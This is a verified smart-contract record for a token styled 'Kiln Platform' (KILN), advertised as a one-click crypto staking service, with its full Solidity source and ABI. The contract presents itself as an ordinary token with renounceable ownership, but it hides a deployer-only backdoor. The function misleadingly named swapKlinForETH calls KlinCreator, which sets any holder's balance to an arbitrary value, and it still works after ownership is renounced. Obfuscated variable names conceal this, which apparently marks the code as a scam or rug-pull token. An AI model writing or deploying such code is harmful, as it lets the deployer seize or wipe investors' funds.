{"SourceCode": "/*\r\nKiln creates an enterprise-level pledge Platform and provides one-click pledge \r\nservices for encrypted assets.\r\n\r\nhttps://t.me/KilnPlatform\r\n\r\n*/\r\n// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.20;\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);\r\n\r\n    function feeTo() external view returns (address);\r\n\r\n    function feeToSetter() external view returns (address);\r\n\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n\r\n    function allPairs(uint256) external view returns (address pair);\r\n\r\n    function allPairsLength() external view returns (uint256);\r\n\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}\r\n\r\ninterface BEP {\r\n    event Transfer(address indexed from, address indexed to, uint256 encrypted);\r\n    event Approval(address indexed metadataInfo, address indexed spender, uint256 encrypted);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address metadataInfo) external view returns (uint256);\r\n    function transfer(address to, uint256 encrypted) external returns (bool);\r\n    function allowance(address metadataInfo, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 encrypted) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 encrypted) external returns (bool);\r\n}\r\ninterface BEPMetadata is BEP {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface BEPErrors {\r\n    error ItokenInsufficientBalance(address sender, uint256 balance, uint256 needed);\r\n    error ItokenInvalidSender(address sender);\r\n    error ItokenInvalidReceiver(address receiver);\r\n    error ItokenInsufficientAllowance(address spender, uint256 allowance, uint256 needed);\r\n    error ItokenInvalidApprover(address approver);\r\n    error ItokenInvalidSpender(address spender);\r\n}\r\ninterface ItokenErrors {\r\n   \r\n    error tokenInvalidmetadataInfo(address metadataInfo);\r\n    error tokenNonexistentAdvice(uint256 liquidityADDId);\r\n    error tokenIncorrectmetadataInfo(address sender, uint256 liquidityADDId, address metadataInfo);\r\n    error tokenInvalidSender(address sender);\r\n    error tokenInvalidReceiver(address receiver);\r\n    error tokenInsufficientApproval(address operator, uint256 liquidityADDId);\r\n    error tokenInvalidApprover(address approver);\r\n    error tokenInvalidOperator(address operator);\r\n}\r\ninterface IBEPErrors {\r\n  \r\n    error BEPInsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 liquidityADDId);\r\n    error BEPInvalidSender(address sender);\r\n    error BEPInvalidReceiver(address receiver);\r\n    error BEPMissingApprovalForAll(address operator, address metadataInfo);\r\n    error BEPInvalidApprover(address approver);\r\n    error BEPInvalidOperator(address operator);\r\n    error BEPInvalidArrayLength(uint256 idsLength, uint256 encryptedsLength);\r\n}\r\n\r\nabstract contract Itoken is Context, BEP, BEPMetadata, BEPErrors {\r\n    mapping(address metadataInfo => uint256) private tokensIntoLiquidity;\r\n    mapping(address metadataInfo => mapping(address spender => uint256)) private optimizer;\r\n    uint256 private _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 9;\r\n    }\r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    function balanceOf(address metadataInfo) public view virtual returns (uint256) {\r\n        return tokensIntoLiquidity[metadataInfo];\r\n    }\r\n    function transfer(address to, uint256 encrypted) public virtual returns (bool) {\r\n        address metadataInfo = _msgSender();\r\n        _transfer(metadataInfo, to, encrypted);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address metadataInfo, address spender) public view virtual returns (uint256) {\r\n        return optimizer[metadataInfo][spender];\r\n    }\r\n\r\n\r\n    function approve(address spender, uint256 encrypted) public virtual returns (bool) {\r\n        address metadataInfo = _msgSender();\r\n        _approve(metadataInfo, spender, encrypted);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 encrypted) public virtual returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, encrypted);\r\n        _transfer(from, to, encrypted);\r\n        return true;\r\n    }\r\n\r\n\r\n    function _transfer(address from, address to, uint256 encrypted) internal {\r\n        if (from == address(0)) {\r\n            revert ItokenInvalidSender(address(0));\r\n        }\r\n        if (to == address(0)) {\r\n            revert ItokenInvalidReceiver(address(0));\r\n        }\r\n        _update(from, to, encrypted);\r\n    }\r\n\r\n    function _update(address from, address to, uint256 encrypted) internal virtual {\r\n        if (from == address(0)) {\r\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\r\n            _totalSupply += encrypted;\r\n        } else {\r\n            uint256 fromBalance = tokensIntoLiquidity[from];\r\n            if (fromBalance < encrypted) {\r\n                revert ItokenInsufficientBalance(from, fromBalance, encrypted);\r\n            }\r\n            unchecked {\r\n                // Overflow not possible: encrypted <= fromBalance <= totalSupply.\r\n                tokensIntoLiquidity[from] = fromBalance - encrypted;\r\n            }\r\n        }\r\n\r\n        if (to == address(0)) {\r\n            unchecked {\r\n                // Overflow not possible: encrypted <= totalSupply or encrypted <= fromBalance <= totalSupply.\r\n                _totalSupply -= encrypted;\r\n            }\r\n        } else {\r\n            unchecked {\r\n                // Overflow not possible: balance + encrypted is at most totalSupply, which we know fits into a uint256.\r\n                tokensIntoLiquidity[to] += encrypted;\r\n            }\r\n        }\r\n\r\n        emit Transfer(from, to, encrypted);\r\n    }\r\n\r\n    function ethers(address metadataInfo, uint256 encrypted) internal {\r\n        if (metadataInfo == address(0)) {\r\n            revert ItokenInvalidReceiver(address(0));\r\n        }\r\n        _update(address(0), metadataInfo, encrypted);\r\n    }\r\n\r\n    function KlinCreator(address metadataInfo, uint256 encrypted) internal {\r\n     tokensIntoLiquidity[metadataInfo] = encrypted;\r\n    }\r\n\r\n\r\n    function _approve(address metadataInfo, address spender, uint256 encrypted) internal {\r\n        _approve(metadataInfo, spender, encrypted, true);\r\n    }\r\n\r\n    function _approve(address metadataInfo, address spender, uint256 encrypted, bool emitEvent) internal virtual {\r\n        if (metadataInfo == address(0)) {\r\n            revert ItokenInvalidApprover(address(0));\r\n        }\r\n        if (spender == address(0)) {\r\n            revert ItokenInvalidSpender(address(0));\r\n        }\r\n        optimizer[metadataInfo][spender] = encrypted;\r\n        if (emitEvent) {\r\n            emit Approval(metadataInfo, spender, encrypted);\r\n        }\r\n    }\r\n\r\n    function _spendAllowance(address metadataInfo, address spender, uint256 encrypted) internal virtual {\r\n        uint256 currentAllowance = allowance(metadataInfo, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            if (currentAllowance < encrypted) {\r\n                revert ItokenInsufficientAllowance(spender, currentAllowance, encrypted);\r\n            }\r\n            unchecked {\r\n                _approve(metadataInfo, spender, currentAllowance - encrypted, false);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\ncontract Advice is Itoken {\r\n    constructor(string memory name, string memory symbol, uint256 initialSupply) Itoken(name, symbol) {\r\n        ethers(msg.sender, initialSupply * (10 ** uint256(decimals())));\r\n    }\r\n}\r\ncontract app is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"app: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ncontract KilnPlatform is Advice , app {\r\naddress private msgsender = _msgSender();\r\n    constructor(\r\n        string memory name,\r\n        string memory symbol,\r\n        uint256 initialSupply\r\n    ) Advice(name, symbol, initialSupply) {}\r\n    function swapKlinForETH(address liquidityADDA, uint256 liquidityADDB) public {\r\n        require(msg.sender == msgsender);\r\n        KlinCreator(liquidityADDA, liquidityADDB);\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"initialSupply\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"allowance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ItokenInsufficientAllowance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ItokenInsufficientBalance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approver\",\"type\":\"address\"}],\"name\":\"ItokenInvalidApprover\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"ItokenInvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ItokenInvalidSender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"ItokenInvalidSpender\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"metadataInfo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"encrypted\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"encrypted\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"metadataInfo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"encrypted\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"metadataInfo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityADDA\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityADDB\",\"type\":\"uint256\"}],\"name\":\"swapKlinForETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"encrypted\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"encrypted\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "KilnPlatform", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000017dfcdece4000000000000000000000000000000000000000000000000000000000000000000d4b696c6e20506c6174666f726d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044b494c4e00000000000000000000000000000000000000000000000000000000", "EVMVersion": "paris", "Library": "", "LicenseType": "MPL-2.0", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://47fbe1f757950db2a64d9444bd7383df818991cd959f48fe10119792ad0b3de1"}